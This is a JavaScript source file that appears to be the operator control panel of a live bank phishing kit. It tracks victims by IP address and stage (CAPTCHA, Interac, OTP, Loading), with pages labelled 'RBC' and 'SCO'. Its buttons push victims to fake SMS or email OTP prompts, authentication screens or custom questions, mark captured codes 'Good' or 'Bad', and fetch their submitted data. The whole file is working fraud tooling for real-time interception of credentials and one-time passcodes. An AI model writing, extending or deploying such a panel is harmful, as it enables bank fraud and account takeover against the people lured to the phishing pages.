// Assuming socket is already defined and connected
const socket = io();

function createUserDiv(ipAddress, details) {
  const color = getColorByStage(details.stage, details.status);
  const userDiv = document.createElement('div');
  userDiv.className = 'col-md-4';
  userDiv.innerHTML = getUserDivInnerHTML(ipAddress, details, color);
  setUserDivEventListeners(userDiv, ipAddress, details);
  return userDiv;
}

function getColorByStage(stage, status) {
  if (stage === 'Finish') return 'warning';
  return status === 'actif' ? 'success' : 'danger';
}

function getUserDivInnerHTML(ipAddress, details, color) {
  // You can add more conditions or modify the HTML structure as per your requirements
  return `
    <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
    <div class="card">
      <div class="card-header"><span class="badge bg-${color}">${ipAddress}</span></div>
      <div class="card-body">
        <h5 class="card-title">${details.page || ''}</h5>
        <p class="card-text">${details.stage || ''}</p>
        ${getActionButtonHTML(details)}
      </div>
    </div>
  `;
}

function getActionButtonHTML(details) {
  // Modify this function to include other actions based on `details`
  if (details.page != 'RBC' && details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
    return `              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>`;
  } else if (details.stage == "OTP") {
    return `<a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
  } else if (details.stage == "Loading") {
    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-success send-otp-good-button">Good</a>
    <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad</a>`;
  } else if (details.page == 'SCO' && details.stage != 'Finish') {
    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
    <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>`;
  } else if (details.page == 'RBC' && details.stage != 'Finish') {
    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
    <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
    <button class="m-1 btn btn-warning customQuestionTrigger" type="button" >Custom Question</button>`;
  } else {
    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
  }
  // Add other conditions as needed
  return '';
}


function setUserDivEventListeners(userDiv, ipAddress, details) {
  // Add event listeners to buttons within userDiv
  const resultsButton = userDiv.querySelector('.results-button');
  const sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
  const sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
  const sendAuthButton = userDiv.querySelector('.send-auth-button');
  const customQuestionTrigger = userDiv.querySelector('.customQuestionTrigger')
  const sendCustomQuestionButton = document.getElementById('sendCustomQuestionButton');

  if (resultsButton) {
    resultsButton.addEventListener('click', () => showResultsModal(ipAddress));
  }
  if (sendOtpSmsButton) {
    sendOtpSmsButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `sms` })
    });
  }
  if (sendOtpEmailButton) {
    sendOtpEmailButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `email` })
    });
  }
  if (sendAuthButton) {
    sendAuthButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `auth` })
    });
  }
  if (customQuestionTrigger) {

    customQuestionTrigger.addEventListener('click', function () {
      $('#customQuestionModal').modal('show');
    });

    sendCustomQuestionButton.addEventListener('click', function () {
      var customQuestion = document.getElementById('customQuestion').value;
      socket.emit('sendOTP', { ip: ipAddress, navig: `qst2`, customQuestion: customQuestion })
      $('#customQuestionModal').modal('hide');
    })
  }
  // Add other event listeners as needed
}

function showResultsModal(ipAddress) {
  // Function to show the results modal for a specific user
  const modalBody = document.querySelector('#resultsModal .modal-body');
  // Assuming you have a function to fetch user data and then display it
  socket.emit('getUserData', { ip: ipAddress });
  socket.on('setUserData', (userData) => {
    console.log(userData)
    modalBody.innerHTML = formatUserDataForDisplay(userData);
    const modal = new bootstrap.Modal(document.getElementById('resultsModal'));
    modal.show();
  })
}

function updateConnectionsTable(users) {
  const container = document.getElementById('userContainer');
  if (!container) return; // Basic error handling

  container.innerHTML = ''; // Clear previous content
  users.sort(compareUserStatus);

  users.forEach(([ipAddress, details]) => {
    const userDiv = createUserDiv(ipAddress, details);
    container.appendChild(userDiv);
  });
}

function compareUserStatus([, details1], [, details2]) {
  return (details1.status === 'actif' && details2.status !== 'actif') ? -1 :
    (details1.status !== 'actif' && details2.status === 'actif') ? 1 : 0;
}

// Assuming updateActiveUserCount is defined elsewhere

// Call this function when the socket receives 'join' or 'leave' events
socket.on('join', users => updateView(users));
socket.on('leave', users => updateView(users));

function updateView(users) {
  const activeCount = users.reduce((count, [, details]) => count + (details.status === 'actif' ? 1 : 0), 0);
  updateConnectionsTable(users);
  updateActiveUserCount(activeCount);
}

function updateActiveUserCount(newCount) {
  document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
}

function formatUserDataForDisplay(userData) {
  
  console.log(`${userData.ipAddress}`);

  socket.on('setUserData', (userData) => {
    Object.entries(userData).forEach(([key, value]) => {
        console.log(`Key: ${key}`)
        console.log(`Value: ${value}`)
    });
  });
  return '';
}

document.getElementById('deleteAll').addEventListener('click', function () {
  socket.emit('deleteAll');
});